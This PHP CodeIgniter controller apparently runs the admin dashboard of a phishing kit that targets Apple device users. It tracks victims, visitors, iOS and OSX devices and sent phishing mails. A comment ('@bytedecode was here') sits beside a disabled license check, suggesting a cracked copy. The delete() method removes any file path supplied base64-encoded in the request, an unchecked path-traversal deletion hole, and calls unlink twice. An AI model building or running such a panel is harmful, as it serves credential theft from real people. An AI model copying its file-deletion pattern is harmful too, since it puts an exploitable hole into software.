<?php

if (!defined("BASEPATH")) {
    exit("No direct script access allowed");
}
class Dashboard extends Admin
{
    public function __construct()
    {
        parent::__construct();
        $this->load->model("Mail_m", "mail");
        $this->load->model("Device_m", "device");
        $this->load->model("Victim_m", "victim");
        $this->load->model("visit_m", "visit");
        if (!isset($this->goptss)) {
            //<-@bytedecode was here
            //exit;
        }
    }
    public function index()
    {
        $data = array("title" => $this->lang->line("Dashdoard_message"), "victim" => count($this->victim->getAll()), "visitor" => $this->visit->getAll(), "devicei" => $this->device->countByIOS(), "devicex" => $this->device->countByOSX(), "mail" => $this->mail->countSent(), "lastVict" => $this->victim->lastVictDone(), "linc" => $this->config->item("licnKeys"), "visit" => $this->visit->getLast(), "updates" => $this->updates());
        $this->blade->view("backend.dashboard", $data);
    }
    private function updates()
    {
        $url = "http://nemoz.net/news.txt";
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HEADER, false);
        $data = curl_exec($curl);
        curl_close($curl);
        $data = explode("%", $data);
        return $data;
    }
    public function delinstall()
    {
        $dir = FCPATH . "/install";
        $del = $this->rrmdir($dir);
        if ($del) {
            redirect(site_url(ADMINPATH . "?success"), "auto");
        } else {
            redirect(site_url(ADMINPATH . "?error"), "auto");
        }
    }
    private function rrmdir($dir)
    {
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file != "." && $file != "..") {
                    $this->rrmdir((string) $dir . "/" . $file);
                }
            }
            rmdir($dir);
            return true;
        } else {
            if (file_exists($dir)) {
                unlink($dir);
                return true;
            }
            return false;
        }
    }
    public function delete($file)
    {
        unlink(FCPATH . "/" . base64_decode($file));
        unlink(FCPATH . "/" . base64_decode($file)) ? redirect(site_url(ADMINPATH . "?success"), "auto") : redirect(site_url(ADMINPATH . "?error"), "auto");
    }
}

?>